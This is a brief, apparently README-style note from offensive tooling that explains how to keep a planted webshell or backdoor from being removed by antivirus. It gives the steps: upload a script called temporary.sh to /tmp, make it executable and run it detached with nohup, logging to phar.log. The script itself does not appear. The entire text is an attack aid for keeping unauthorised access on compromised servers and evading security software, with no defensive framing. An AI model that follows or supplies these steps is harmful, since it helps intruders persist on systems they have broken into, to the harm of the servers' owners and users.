if your backdoor always deleted by antivirus or something

you can protect the webshell use this.

POC:
[-] upload temporary.sh on tmp or wherever u want
[-] chmod +x temporary.sh
[-] run the command like this ( nohup ./temporary.sh > phar.log 2>&1 & )

use phar.log for see the error and see your destination directory its writeable or not
